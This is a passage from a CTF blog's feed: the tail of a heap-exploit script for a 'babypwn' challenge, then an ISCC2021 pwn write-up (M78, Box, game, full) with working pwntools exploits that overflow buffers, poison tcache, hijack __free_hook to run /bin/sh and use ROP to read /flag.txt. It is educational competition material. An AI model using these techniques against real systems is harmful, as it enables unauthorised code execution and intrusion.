class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libcfind</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babypwn'</span>)</span><br><span class="line">p=process(<span class="string">'./babypwn'</span>)</span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text=<span class="string">''</span>)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt;&gt;'</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'index:'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span><span class="params">(v2)</span>:</span></span><br><span class="line">    s=Solver()</span><br><span class="line">    a1=BitVec(<span class="string">'a1'</span>,<span class="number">32</span>) </span><br><span class="line">    t = a1</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">            a1 ^= (<span class="number">32</span> * a1) ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>)) ^ (((<span class="number">32</span> * a1) ^ a1 ^ (LShR((a1 ^ (<span class="number">32</span> * a1)), <span class="number">17</span>))) &lt;&lt; <span class="number">13</span>)</span><br><span class="line">    s.add(a1 == int(v2,<span class="number">16</span>))</span><br><span class="line">    s.check()</span><br><span class="line">    ans = int(s.model()[t].as_long())</span><br><span class="line">    print(hex(ans))</span><br><span class="line">    <span class="keyword">return</span> p32(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">0xf0</span>)<span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x88</span>)<span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">edit(<span class="number">9</span>,<span class="number">0xf0</span>*<span class="string">'1'</span>+p64(<span class="number">0x100</span>)+p64(<span class="number">0x11</span>))</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">edit(<span class="number">8</span>,<span class="number">0x88</span>*<span class="string">'1'</span>)</span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#0</span></span><br><span class="line">p.recv()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">x=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">x=decode(x)</span><br><span class="line">y=x+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">main_arena=addr<span class="number">-328</span></span><br><span class="line">malloc=main_arena<span class="number">-0x10</span></span><br><span class="line">log,info(<span class="string">'malloc:'</span>+hex(malloc))</span><br><span class="line">x=libcfind.finder(<span class="string">'__malloc_hook'</span>,malloc,num=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#1</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">'yyyyyyy'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x80</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>)<span class="comment">#10</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#11</span></span><br><span class="line">add(<span class="number">0x40</span>)<span class="comment">#13</span></span><br><span class="line">free(<span class="number">13</span>)</span><br><span class="line">free(<span class="number">11</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0x48</span>)</span><br><span class="line">rdi_ret=x.libcbase+<span class="number">0x0000000000025a3b</span></span><br><span class="line">rsi_ret=x.libcbase+<span class="number">0x00000000000263e9</span></span><br><span class="line">rdx_ret=x.libcbase+<span class="number">0x00000000001018c5</span></span><br><span class="line">rbp_ret=x.libcbase+<span class="number">0x000000000004a1a7</span></span><br><span class="line">rax=x.libcbase+<span class="number">0x000000000002606c</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x48</span>)<span class="comment">#13</span></span><br><span class="line">add(<span class="number">0x100</span>)</span><br><span class="line">show(<span class="number">6</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">xx=p.recvline()</span><br><span class="line">y=p.recvline()</span><br><span class="line">xx=decode(xx)</span><br><span class="line">y=xx+decode(y)</span><br><span class="line">addr=u64(y)</span><br><span class="line">log.info(hex(addr))</span><br><span class="line">edit(<span class="number">13</span>,p64(x.dump(<span class="string">'setcontext'</span>)+<span class="number">53</span>))</span><br><span class="line">pay=p64(rdi_ret)+p64(<span class="number">0</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(addr)+p64(rsi_ret)+p64(<span class="number">0</span>)+p64(rdx_ret)+p64(<span class="number">0</span>)+p64(x.dump(<span class="string">'open'</span>))<span class="comment">#open(addr,0,0)</span></span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">3</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'read'</span>))</span><br><span class="line">pay+=p64(rdi_ret)+p64(<span class="number">1</span>)+p64(rsi_ret)+p64(addr)+p64(rdx_ret)+p64(<span class="number">0x40</span>)+p64(x.dump(<span class="string">'write'</span>))</span><br><span class="line">print(len(pay))</span><br><span class="line">add(<span class="number">0x200</span>)</span><br><span class="line">edit(<span class="number">15</span>,pay)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x10</span>+p64(addr+<span class="number">0x118</span>+<span class="number">0x360</span>)+p64(rdi_ret)+<span class="string">'1'</span>*<span class="number">0x18</span>+<span class="string">'3'</span>*<span class="number">0x40</span>+<span class="string">'22222'</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00'</span>)</span><br><span class="line"><span class="comment">#free(10)</span></span><br><span class="line"><span class="comment">#edit(10,'xxxxxxx')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;tcl,逆向能力薄弱的我被qwb打傻了.赛后复现时,发现好多题思路是对的.卡在了逆向反推上面.但反过来,在赛后看了很多大牛的博客后,也学习到很多知识,想这段时间忙完后单独写几篇来坐坐笔记。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>ISCC2021 PWN部分 WP</title>
    <link href="lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/"/>
    <id>lexsd6.github.io/2021/05/28/ISCC2021%20PWN%20WP/</id>
    <published>2021-05-28T01:44:14.705Z</published>
    <updated>2021-05-28T03:13:52.456Z</updated>
    
    <content type="html"><![CDATA[<p>今年终于有机会去体验iscc了，也感受到了什么是pycc的力量了。（人均全栈，233雾）<a id="more"></a></p><h2 id="M78"><a href="#M78" class="headerlink" title="M78"></a>M78</h2><p>经典的整数溢出与栈溢出.利用262来整数逃过判断,扩大栈上写入字节造成栈溢出.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./M78'</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7010</span>)</span><br><span class="line">p.sendline(<span class="string">'1\x00'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Please choose a building'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'Please input the password'</span>)</span><br><span class="line"></span><br><span class="line">shell=<span class="string">'a'</span>*(<span class="number">0x18</span>+<span class="number">4</span>)+p32(e.symbols[<span class="string">'call_main'</span>])</span><br><span class="line"></span><br><span class="line">p.sendline(shell+<span class="string">'a'</span>*(<span class="number">262</span>-len(shell)))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Box"><a href="#Box" class="headerlink" title="Box"></a>Box</h2><p>old-2.27版的堆题,限制了最多申请6个同种堆块,通过连续二次释放0x90大小的堆块.获得chunk地址.更改tcache 管理结构体,伪造其填满.再释放0x90大小的堆块获得libc基地址.再在<code>__free_hook</code>上写入system 从而getshel。l</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">l=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"><span class="comment">#l=ELF('/glibc/2.27/amd64/lib/libc.so.6')</span></span><br><span class="line"><span class="comment">#p=process('./pwn')</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7020</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num,size,text)</span>:</span></span><br><span class="line"><span class="comment">#p.recvuntil('&gt;&gt; ')</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Input the size:'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Input data:'</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.send(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Please input the data:'</span>)</span><br><span class="line">p.send(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Input the index:'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.recvuntil(<span class="string">'Here is it :'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x90</span>,<span class="string">'111'</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x90</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">chunk_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">log.info(<span class="string">'chunk_addr:'</span>+hex(chunk_addr))</span><br><span class="line">tache_addr=chunk_addr<span class="number">-0x260</span></span><br><span class="line">log.info(<span class="string">'tache_addr:'</span>+hex(tache_addr))</span><br><span class="line">edit(<span class="number">2</span>,p64(tache_addr+<span class="number">0x10</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#add(2,0x40,p8(7)*0x10)</span></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x90</span>,p8(<span class="number">7</span>)*<span class="number">0x10</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x90</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">show(<span class="number">3</span>)</span><br><span class="line">main_arena_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-96</span></span><br><span class="line">log.info(<span class="string">'main_arena_addr:'</span>+hex(main_arena_addr))</span><br><span class="line">base=main_arena_addr<span class="number">-0x3afc40</span></span><br><span class="line">log.info(<span class="string">'blic_base_addr:'</span>+hex(base))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">edit(<span class="number">4</span>,p8(<span class="number">6</span>)*<span class="number">0x40</span>+p64(base+l.symbols[<span class="string">'__free_hook'</span>])+p64(base+l.symbols[<span class="string">'__free_hook'</span>]))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x20</span>,p64(base+l.symbols[<span class="string">'system'</span>]))</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">edit(<span class="number">4</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="game"><a href="#game" class="headerlink" title="game"></a>game</h2><p>经典的伪随机数问题，通过<code>from ctypes import *</code>的<code>CDLL</code>本地模拟随机数生成，同时利用栈溢出控制伪随机数种子。从而控制随机数产生。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">e=ELF(<span class="string">'./game'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p=remote(<span class="string">'39.96.88.40'</span>,<span class="number">7040</span>)</span><br><span class="line"><span class="comment">#process('./game')</span></span><br><span class="line">c = CDLL(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">c.srand(<span class="number">1</span>) </span><br><span class="line">pay=<span class="string">'a'</span>*(<span class="number">0x24</span>)+p32(<span class="number">2</span>)+p32(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(pay)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">    <span class="comment">#p.recvuntil('point(1~6):')</span></span><br><span class="line">x=c.rand()</span><br><span class="line"><span class="comment">#print(x)</span></span><br><span class="line">c.srand(x)</span><br><span class="line">l=c.rand()%<span class="number">0x64</span>+<span class="number">1</span> </span><br><span class="line">print(l)</span><br><span class="line"><span class="comment">#p.interactive()</span></span><br><span class="line">p.sendline(str(l))</span><br><span class="line"><span class="comment">#print(l)</span></span><br><span class="line">print(p.recv())</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="full"><a href="#full" class="headerlink" title="full"></a>full</h2><p>由于没有打印信息的函数,且程序PIE是关闭的,通常就会想到ret2dl_resolve。但是做了半天发现不行，看了下保护：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (<span class="number">0x400000</span>)</span><br></pre></td></tr></table></figure><p>发现 <code>Full RELRO</code>开着，wro……</p><p>但是查阅资料发现<a href="https://gdufs-king.github.io/2020/01/03/%E7%A5%9E%E5%A5%87%E7%9A%84gadget/" target="_blank" rel="noopener">神奇的gadget</a>一文提供了，将真实地址转移到栈上修改的思路。虽然题目中没有这个gadget但是提供了memcpy 函数。</p><p>有根据在大多数libc中read与write的symbols只一个字节不同的特性，同过将read打印到栈上修改成write从而泄露libc。</p><p>然后不知道为啥system无法执行（菜鸡推测是栈上问题），于是用orw（open-read-write）方法强行读取flag文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.arch=<span class="string">'i386'</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./full'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote('39.96.88.40',7050)</span></span><br><span class="line">p=process(<span class="string">'./full'</span>)</span><br><span class="line">pppr_addr      = <span class="number">0x08048519</span>     <span class="comment"># pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">pop_ebp_addr   = <span class="number">0x0804851b</span>     <span class="comment"># pop ebp ; ret</span></span><br><span class="line">leave_ret_addr = <span class="number">0x080483c5</span>     <span class="comment"># leave ; ret</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay1=<span class="string">'12cdefghijklmn'</span>+p32(<span class="number">0x0804A040</span>+<span class="number">0x10</span>+<span class="number">0x8</span>)+p8(<span class="number">1</span>)*<span class="number">2</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a240</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">"memcpy"</span>])+p32(pppr_addr)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x8049ff0</span>)+p32(<span class="number">4</span>)</span><br><span class="line"><span class="comment">#栈转移</span></span><br><span class="line"></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x1</span>)</span><br><span class="line">pay1+=p32(<span class="number">0x08048518</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x41</span>)+p32(<span class="number">0x40</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">0x08048504</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x804a260</span>)+p32(<span class="number">8</span>)+<span class="string">'1111'</span>*<span class="number">4</span>+<span class="string">'2222'</span>*<span class="number">4</span></span><br><span class="line">pay1+=p32(elf.symbols[<span class="string">'read'</span>])+p32(pppr_addr)+p32(<span class="number">0</span>)+p32(<span class="number">168</span>+<span class="number">0x0804A040</span>)+p32(<span class="number">0x100</span>)</span><br><span class="line">print(len(pay1))<span class="comment">#布局gadget，ret2csu调用write打印真实地址</span></span><br><span class="line"></span><br><span class="line">p.sendline(pay1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'/flag.txt\x00\x00'</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p8(<span class="number">0xb0</span>))<span class="comment"># yuancheng  #经过爆破发现将read真实地址改为0xb0恰好是write</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p.send(p8(0x90)) #本地</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line">print(hex(write))</span><br><span class="line">libc = LibcSearcher(<span class="string">'write'</span>, write)</span><br><span class="line">libcbase = write - libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'base:'</span>+hex(libcbase))</span><br><span class="line"></span><br><span class="line">system=libcbase+libc.dump(<span class="string">'system'</span>)</span><br><span class="line">read_0=libcbase+libc.dump(<span class="string">'open'</span>)</span><br><span class="line">write_0=libcbase+libc.dump(<span class="string">'write'</span>)</span><br><span class="line">log.info(<span class="string">'libcbase+system:'</span>+hex(system))</span><br><span class="line">binsh_addr = libcbase + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span 